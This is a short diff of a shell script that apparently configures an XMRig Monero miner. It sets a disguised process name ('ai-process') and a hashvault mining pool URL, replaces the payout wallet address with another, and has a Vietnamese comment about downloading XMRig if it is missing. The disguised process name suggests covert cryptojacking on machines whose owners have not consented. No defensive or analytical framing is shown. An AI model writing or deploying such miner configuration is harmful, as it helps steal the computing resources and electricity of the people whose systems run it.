@@ -2,7 +2,7 @@
 
 FAKE_NAME="ai-process"
 POOL_URL="pool.hashvault.pro:443"
-WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
 
 # Tải XMrig nếu chưa có
 if [ ! -f "./xmrig" ]; then
